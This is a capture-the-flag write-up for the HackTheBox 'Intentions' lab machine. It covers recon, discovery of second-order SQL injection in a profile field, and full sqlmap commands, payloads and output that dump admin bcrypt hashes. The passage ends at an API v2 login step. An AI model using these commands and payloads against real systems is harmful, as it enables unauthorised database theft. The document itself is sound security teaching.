---
{"dg-publish":true,"permalink":"/ct-fs/htb/intentions/","dg-note-properties":{}}
---

#linux #bcrypt #api

## By 0xCapra_Daemon aka Will Keller

## Contents

## Recon
![Pasted image 20260724154657.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260724154657.png)
```zsh
Enter your target IP address or URL here: 10.129.229.27
------------------------------------------------------------
Scanning target 10.129.229.27
Time started: 2026-07-24 18:45:31.287633
------------------------------------------------------------
Port 22 is open
Port 80 is open
Port scan completed in 0:00:33.331378
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.129.229.27 10.129.229.27
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.129.229.27 10.129.229.27
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-24 18:47 -0400
Nmap scan report for 10.129.229.27
Host is up (0.088s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)
|_  256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Intentions
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.56 seconds
```
Initial portscan shows ports 22 and 80 open.

```zsh
curl -v http://intentions.htb
* Host intentions.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.229.27
*   Trying 10.129.229.27:80...
* Established connection to intentions.htb (10.129.229.27 port 80) from 10.10.14.192 port 57032 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: intentions.htb
> User-Agent: curl/8.20.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Cache-Control: no-cache, private
< Date: Fri, 24 Jul 2026 22:49:13 GMT
< Set-Cookie: XSRF-TOKEN=eyJpdiI6IndEYk5zSjYzY2lzTXU5MW5WcXVVN2c9PSIsInZhbHVlIjoiczIvTDk5UEdCRHh1THdMSkZ1YUJ5cmpWaVl1Tytibzg3S2JUMW5KTzJCRzNuWGFzeE92UGsyU2RxWGw0K28waW51VVBrUUQxMkJoSGliNGE1bDU5c09yWDJrZTgyRGoyWUhMMTEva3NSL2VOWlhZZDBvcG41OHBLZjY2TElTd2giLCJtYWMiOiIwOGMyYjdhNTJkZWRjYjc0MmEzMGZjYzdiYzIyYTU0YjM2OTc2MDgzNTI2YTRlN2ZlNjYzYjJlNjM3YjAwYmRhIiwidGFnIjoiIn0%3D; expires=Sat, 25-Jul-2026 00:49:13 GMT; Max-Age=7200; path=/; samesite=lax
< Set-Cookie: intentions_session=eyJpdiI6ImtvUjdMZG5TdEJ0bGllREhScENjZkE9PSIsInZhbHVlIjoiSVR2U29URGZFekJWNlFqemxrWkp3dlZYeXZPUStxNGhUczdXbUJmY3RpMWpPcmIxVkV1QnVtTzVTODZPZDZ3cWNSRHQrOXhhZlNwUHNDeFI1T2tDR3RkUEpKSGVHSjJSSEt0ZTF2ZElhUnRGNnZZM2J2WHdobkcvMHo5ODlwSUQiLCJtYWMiOiJmNDI2Y2M1MjFkNzNjMTQ4NTIzYmRjZTM0NmU2ZDkwNWY4Y2FhYzI2ZjQ3ODIyMGFlODM0NDMyMmU4ZmU2M2FmIiwidGFnIjoiIn0%3D; expires=Sat, 25-Jul-2026 00:49:13 GMT; Max-Age=7200; path=/; httponly; samesite=lax
< X-Frame-Options: SAMEORIGIN
< X-XSS-Protection: 1; mode=block
<
...SNIP...
```
`cURL` to the server shows an XSRF and Session cookie which both appear to be JWTs.

![Pasted image 20260724155347.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260724155347.png)
visiting the site in the browser reveals the `Intentions Image Gallery` with a login and registry portal.

![Pasted image 20260724155524.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260724155524.png)
Successfully made our own user account on the server.

![Pasted image 20260724155600.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260724155600.png)
![Pasted image 20260724155622.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260724155622.png)
Successfully authenticated to the app with our newly minted `Hacker` user

![Pasted image 20260724155818.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260724155818.png)
Clicking through to `Gallery` with dev tools running the network tab we see that this runs on an api architecture.

![Pasted image 20260724160330.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260724160330.png)
Decoding our token called `Token` we do confirm the existence of this api


![Pasted image 20260727154234.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260727154234.png)
Navigating to other pages reveals a `Your Profile` section allowing user input in the `Favorite Genres` section.

![Pasted image 20260727154419.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260727154419.png)
User supplied input from `Your Profile --> Favorite Genres` is reflected in what appears on the `Your Feed` tab. This may be a candidate for second order SQLi.

![Pasted image 20260727154609.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260727154609.png)
![Pasted image 20260727154720.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260727154720.png)
Adding both a single quote or a double quote to the end of the entry renders `Your Feed` blank. This may indicate a behavioral based SQL analysis.

![Pasted image 20260727164053.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260727164053.png)
![Pasted image 20260727164008.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260727164008.png)

We capture the POST request of the `Your Feed` input and the GET request of the `Your Feed` request in burp to validate our SQL entry point.

```zsh
(kali㉿kali)-[~/CTF/HTB/intentions/files]
└─$ sqlmap -r post.req -p "genres" --second-url "http://intentions.htb/api/v1/gallery/user/feed"
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.10.6#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:42:06 /2026-07-27/

```
We construct our `sqlmap` syntax with the POST request file we pulled down form burp along with the direct URL of the `Your Feed` endpoint that we need to use for the second-order validation.

```zsh
[*] starting @ 19:42:06 /2026-07-27/

[19:42:06] [INFO] parsing HTTP request from 'post.req'
JSON data found in POST body. Do you want to process it? [Y/n/q] y
[19:42:12] [INFO] testing connection to the target URL
[19:42:13] [INFO] testing if the target URL content is stable
[19:42:13] [INFO] target URL content is stable
[19:42:13] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON genres' might not be injectable
[19:42:14] [INFO] testing for SQL injection on (custom) POST parameter 'JSON genres'
[19:42:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:42:16] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:42:16] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:42:17] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[19:42:18] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[19:42:20] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[19:42:21] [INFO] testing 'Generic inline queries'
[19:42:21] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[19:42:22] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[19:42:23] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[19:42:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:42:25] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[19:42:26] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[19:42:27] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[19:42:32] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:42:33] [WARNING] (custom) POST parameter 'JSON genres' does not seem to be injectable
[19:42:33] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[19:42:33] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 40 times

```
This fails. However the app suggests if there's some sort of filter or WAF protection mechanism to use the `--tamper=space2comment` flag to see if it can mangle the request further.

## Initial Access

```zsh
(custom) POST parameter 'JSON genres' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 106 HTTP(s) requests:
---
Parameter: JSON genres ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"genres":"animals') AND 1651=1651 AND ('mNDe'='mNDe"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"genres":"animals') AND (SELECT 2422 FROM (SELECT(SLEEP(5)))wRqy) AND ('JFKm'='JFKm"}

    Type: UNION query
    Title: MySQL UNION query (NULL) - 5 columns
    Payload: {"genres":"animals') UNION ALL SELECT NULL,NULL,CONCAT(0x7176627671,0x595a4b4c53424b6365657865766b504d6347735354486f4e41704658624a526a574a61594d46686a,0x717a6a7071),NULL,NULL#"}
---
[19:46:49] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[19:46:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:46:50] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 85 times
[19:46:50] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/intentions.htb'


```
Just like that, sqlmap identified an injection point. We will now use sqlmap to enumerate the database.

```zsh

└─$ sqlmap -r post.req -p "genres" --second-url "http://intentions.htb/api/v1/gallery/user/feed" --tamper=space2comment --tables
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10.6#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:48:12 /2026-07-27/

[19:48:12] [INFO] parsing HTTP request from 'post.req'
[19:48:12] [INFO] loading tamper module 'space2comment'
JSON data found in POST body. Do you want to process it? [Y/n/q] y
[19:48:14] [INFO] resuming back-end DBMS 'mysql' 
[19:48:14] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON genres ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"genres":"animals') AND 1651=1651 AND ('mNDe'='mNDe"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"genres":"animals') AND (SELECT 2422 FROM (SELECT(SLEEP(5)))wRqy) AND ('JFKm'='JFKm"}

    Type: UNION query
    Title: MySQL UNION query (NULL) - 5 columns
    Payload: {"genres":"animals') UNION ALL SELECT NULL,NULL,CONCAT(0x7176627671,0x595a4b4c53424b6365657865766b504d6347735354486f4e41704658624a526a574a61594d46686a,0x717a6a7071),NULL,NULL#"}
---
[19:48:15] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[19:48:15] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:48:15] [INFO] fetching database names
[19:48:15] [WARNING] reflective value(s) found and filtering out
[19:48:15] [INFO] fetching tables for databases: 'information_schema, intentions'
Database: information_schema
[79 tables]
+---------------------------------------+
| ALL_PLUGINS                           |
| APPLICABLE_ROLES                      |
| CHARACTER_SETS                        |
| CHECK_CONSTRAINTS                     |
| CLIENT_STATISTICS                     |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMN_PRIVILEGES                     |
| ENABLED_ROLES                         |
| FILES                                 |
| GEOMETRY_COLUMNS                      |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INDEX_STATISTICS                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_PER_INDEX                  |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_CMP_RESET                      |
| INNODB_FT_BEING_DELETED               |
| INNODB_FT_CONFIG                      |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_FT_DELETED                     |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_METRICS                        |
| INNODB_SYS_COLUMNS                    |
| INNODB_SYS_FIELDS                     |
| INNODB_SYS_FOREIGN                    |
| INNODB_SYS_FOREIGN_COLS               |
| INNODB_SYS_INDEXES                    |
| INNODB_SYS_TABLES                     |
| INNODB_SYS_TABLESPACES                |
| INNODB_SYS_TABLESTATS                 |
| INNODB_SYS_VIRTUAL                    |
| INNODB_TABLESPACES_ENCRYPTION         |
| INNODB_TRX                            |
| KEYWORDS                              |
| KEY_CACHES                            |
| KEY_COLUMN_USAGE                      |
| OPTIMIZER_TRACE                       |
| PARAMETERS                            |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| SPATIAL_REF_SYS                       |
| SQL_FUNCTIONS                         |
| STATISTICS                            |
| SYSTEM_VARIABLES                      |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TABLE_STATISTICS                      |
| THREAD_POOL_GROUPS                    |
| THREAD_POOL_QUEUES                    |
| THREAD_POOL_STATS                     |
| THREAD_POOL_WAITS                     |
| USER_PRIVILEGES                       |
| USER_STATISTICS                       |
| VIEWS                                 |
| COLUMNS                               |
| ENGINES                               |
| EVENTS                                |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| TABLES                                |
| TRIGGERS                              |
| user_variables                        |
+---------------------------------------+

Database: intentions
[4 tables]
+---------------------------------------+
| gallery_images                        |
| migrations                            |
| personal_access_tokens                |
| users                                 |
+---------------------------------------+

[19:48:15] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/intentions.htb'

[*] ending @ 19:48:15 /2026-07-27/

```
As we can see there's the default `Information Schema` db which describes the architecture of the user created one called `intentions` in our case. I'm immediately drawn to the `personal_access_tokens` and `users` tables. Let's dump them.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/intentions/files]
└─$ sqlmap -r post.req -p "genres" --second-url "http://intentions.htb/api/v1/gallery/user/feed" --tamper=space2comment -D intentions -T users -C email,name,admin,password --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10.6#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:53:00 /2026-07-27/

[19:53:00] [INFO] parsing HTTP request from 'post.req'
[19:53:00] [INFO] loading tamper module 'space2comment'
JSON data found in POST body. Do you want to process it? [Y/n/q] y
[19:53:01] [INFO] resuming back-end DBMS 'mysql' 
[19:53:01] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON genres ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"genres":"animals') AND 1651=1651 AND ('mNDe'='mNDe"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"genres":"animals') AND (SELECT 2422 FROM (SELECT(SLEEP(5)))wRqy) AND ('JFKm'='JFKm"}

    Type: UNION query
    Title: MySQL UNION query (NULL) - 5 columns
    Payload: {"genres":"animals') UNION ALL SELECT NULL,NULL,CONCAT(0x7176627671,0x595a4b4c53424b6365657865766b504d6347735354486f4e41704658624a526a574a61594d46686a,0x717a6a7071),NULL,NULL#"}
---
[19:53:01] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[19:53:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:53:01] [INFO] fetching entries of column(s) '`admin`,`name`,email,password' for table 'users' in database 'intentions'
[19:53:01] [WARNING] reflective value(s) found and filtering out
Database: intentions
Table: users
[28 entries]
+-------------------------------+--------------------------+---------+--------------------------------------------------------------+
| email                         | name                     | admin   | password                                                     |
+-------------------------------+--------------------------+---------+--------------------------------------------------------------+
| steve@intentions.htb          | steve                    | 1       | $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa |
| greg@intentions.htb           | greg                     | 1       | $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m |
| hettie.rutherford@example.org | Melisa Runolfsson        | 0       | $2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6 |
| nader.alva@example.org        | Camren Ullrich           | 0       | $2y$10$WkBf7NFjzE5GI5SP7hB5/uA9Bi/BmoNFIUfhBye4gUql/JIc/GTE2 |
| jones.laury@example.com       | Mr. Lucius Towne I       | 0       | $2y$10$JembrsnTWIgDZH3vFo1qT.Zf/hbphiPj1vGdVMXCk56icvD6mn/ae |
| wanda93@example.org           | Jasen Mosciski           | 0       | $2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW |
| mwisoky@example.org           | Monique D'Amore          | 0       | $2y$10$pAMvp3xPODhnm38lnbwPYuZN0B/0nnHyTSMf1pbEoz6Ghjq.ecA7. |
| lura.zieme@example.org        | Desmond Greenfelder      | 0       | $2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4/dXv1jnfBVCpaR2h.SDDioy2 |
| pouros.marcus@example.net     | Mrs. Roxanne Raynor      | 0       | $2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3/Kx82hjqbJFMO |
| mellie.okon@example.com       | Rose Rutherford          | 0       | $2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx/kpO/XcKw1m |
| trace94@example.net           | Dr. Chelsie Greenholt I  | 0       | $2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W |
| kayleigh18@example.com        | Prof. Johanna Ullrich MD | 0       | $2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi |
| tdach@example.com             | Prof. Gina Brekke        | 0       | $2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2. |
| lindsey.muller@example.org    | Jarrett Bayer            | 0       | $2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS |
| tschmidt@example.org          | Macy Walter              | 0       | $2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm |
| murray.marilie@example.com    | Prof. Devan Ortiz DDS    | 0       | $2y$10$I7I4W5pfcLwu3O/wJwAeJ.xqukO924Tx6WHz1am.PtEXFiFhZUd9S |
| barbara.goodwin@example.com   | Eula Shields             | 0       | $2y$10$0fkHzVJ7paAx0rYErFAtA.2MpKY/ny1.kp/qFzU22t0aBNJHEMkg2 |
| maggio.lonny@example.org      | Mariano Corwin           | 0       | $2y$10$p.QL52DVRRHvSM121QCIFOJnAHuVPG5gJDB/N2/lf76YTn1FQGiya |
| chackett@example.org          | Madisyn Reinger DDS      | 0       | $2y$10$GDyg.hs4VqBhGlCBFb5dDO6Y0bwb87CPmgFLubYEdHLDXZVyn3lUW |
| layla.swift@example.net       | Jayson Strosin           | 0       | $2y$10$Gy9v3MDkk5cWO40.H6sJ5uwYJCAlzxf/OhpXbkklsHoLdA8aVt3Ei |
| rshanahan@example.net         | Zelda Jenkins            | 0       | $2y$10$/2wLaoWygrWELes242Cq6Ol3UUx5MmZ31Eqq91Kgm2O8S.39cv9L2 |
| shyatt@example.com            | Eugene Okuneva I         | 0       | $2y$10$k/yUU3iPYEvQRBetaF6GpuxAwapReAPUU8Kd1C0Iygu.JQ/Cllvgy |
| sierra.russel@example.com     | Mrs. Rhianna Hahn DDS    | 0       | $2y$10$0aYgz4DMuXe1gm5/aT.gTe0kgiEKO1xf/7ank4EW1s6ISt1Khs8Ma |
| ferry.erling@example.com      | Viola Vandervort DVM     | 0       | $2y$10$iGDL/XqpsqG.uu875Sp2XOaczC6A3GfO5eOz1kL1k5GMVZMipZPpa |
| beryl68@example.org           | Prof. Margret Von Jr.    | 0       | $2y$10$stXFuM4ct/eKhUfu09JCVOXCTOQLhDQ4CFjlIstypyRUGazqmNpCa |
| ellie.moore@example.net       | Florence Crona           | 0       | $2y$10$NDW.r.M5zfl8yDT6rJTcjemJb0YzrJ6gl6tN.iohUugld3EZQZkQy |
| littel.blair@example.org      | Tod Casper               | 0       | $2y$10$S5pjACbhVo9SGO4Be8hQY.Rn87sg10BTQErH3tChanxipQOe9l7Ou |
| hacker@mail.com               | Hacker                   | 0       | $2y$10$dnSPLs/y8KVhELULETKPD.naEnBg0qR4jKWXrA4QbAqB67lVICGRO |
+-------------------------------+--------------------------+---------+--------------------------------------------------------------+

[19:53:01] [INFO] table 'intentions.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/intentions.htb/dump/intentions/users.csv'
[19:53:01] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/intentions.htb'


```
As you can see, we successfully dump the `users` table with the columns `email,name,admin,password` specified. This gives us the potential creds of any admin user on this app. but let's also take a look at the `personal_access_tokens` table as well.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/intentions/files]
└─$ sqlmap -r post.req -p "genres" --second-url "http://intentions.htb/api/v1/gallery/user/feed" --tamper=space2comment -D intentions -T personal_access_tokens --dump                                                       
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.10.6#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:58:17 /2026-07-27/

[19:58:17] [INFO] parsing HTTP request from 'post.req'
[19:58:17] [INFO] loading tamper module 'space2comment'
JSON data found in POST body. Do you want to process it? [Y/n/q] y
[19:58:18] [INFO] resuming back-end DBMS 'mysql' 
[19:58:18] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON genres ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"genres":"animals') AND 1651=1651 AND ('mNDe'='mNDe"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"genres":"animals') AND (SELECT 2422 FROM (SELECT(SLEEP(5)))wRqy) AND ('JFKm'='JFKm"}

    Type: UNION query
    Title: MySQL UNION query (NULL) - 5 columns
    Payload: {"genres":"animals') UNION ALL SELECT NULL,NULL,CONCAT(0x7176627671,0x595a4b4c53424b6365657865766b504d6347735354486f4e41704658624a526a574a61594d46686a,0x717a6a7071),NULL,NULL#"}
---
[19:58:18] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[19:58:18] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:58:18] [INFO] fetching columns for table 'personal_access_tokens' in database 'intentions'
[19:58:18] [INFO] fetching entries for table 'personal_access_tokens' in database 'intentions'
[19:58:19] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[19:58:19] [INFO] fetching number of entries for table 'personal_access_tokens' in database 'intentions'
[19:58:20] [INFO] resumed: 0
[19:58:20] [WARNING] table 'personal_access_tokens' in database 'intentions' appears to be empty
Database: intentions
Table: personal_access_tokens
[0 entries]
+----+--------------+-------+--------+-----------+------------+------------+--------------+----------------+
| id | tokenable_id | token | name   | abilities | created_at | updated_at | last_used_at | tokenable_type |
+----+--------------+-------+--------+-----------+------------+------------+--------------+----------------+
+----+--------------+-------+--------+-----------+------------+------------+--------------+----------------+

[19:58:20] [INFO] table 'intentions.personal_access_tokens' dumped to CSV file '/home/kali/.local/share/sqlmap/output/intentions.htb/dump/intentions/personal_access_tokens.csv'
[19:58:20] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/intentions.htb'

[*] ending @ 19:58:20 /2026-07-27/

```
nothing in that one but good enumeration practice overall.

```zsh
sqlmap -r post.req -p "genres" --second-url "http://intentions.htb/api/v1/gallery/user/feed" --tamper=space2comment -D intentions -T users -C email,name,admin,password --where "admin=1" --dump --batch
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.10.6#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:59:55 /2026-07-27/

[19:59:55] [INFO] parsing HTTP request from 'post.req'
[19:59:55] [INFO] loading tamper module 'space2comment'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[19:59:55] [INFO] resuming back-end DBMS 'mysql' 
[19:59:55] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON genres ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"genres":"animals') AND 1651=1651 AND ('mNDe'='mNDe"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"genres":"animals') AND (SELECT 2422 FROM (SELECT(SLEEP(5)))wRqy) AND ('JFKm'='JFKm"}

    Type: UNION query
    Title: MySQL UNION query (NULL) - 5 columns
    Payload: {"genres":"animals') UNION ALL SELECT NULL,NULL,CONCAT(0x7176627671,0x595a4b4c53424b6365657865766b504d6347735354486f4e41704658624a526a574a61594d46686a,0x717a6a7071),NULL,NULL#"}
---
[19:59:55] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[19:59:55] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:59:55] [INFO] fetching entries of column(s) '`admin`,`name`,email,password' for table 'users' in database 'intentions'
[19:59:55] [WARNING] reflective value(s) found and filtering out
Database: intentions
Table: users
[2 entries]
+----------------------+--------+---------+--------------------------------------------------------------+
| email                | name   | admin   | password                                                     |
+----------------------+--------+---------+--------------------------------------------------------------+
| steve@intentions.htb | steve  | 1       | $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa |
| greg@intentions.htb  | greg   | 1       | $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m |
+----------------------+--------+---------+--------------------------------------------------------------+

[19:59:55] [INFO] table 'intentions.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/intentions.htb/dump/intentions/users.csv'
[19:59:55] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/intentions.htb'

[*] ending @ 19:59:55 /2026-07-27
```
Cleaning up the query even more I singled out users that only had the admin check next to thier account in the table. It returned two users: `steve@intentions.htb` and `greg@intentions.htb`. We'll take these hashes offline and attempt a crack as well as enumerating the app further.


![Pasted image 20260727172318.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260727172318.png)
Manually enumerating the api version on already identified endpoints like `/auth/login` that we sent a POST request to earlier in the `v1` version to login gives us a `method not allowed` message. Let's try changing our login POST request from last time to the newly found `v2`.

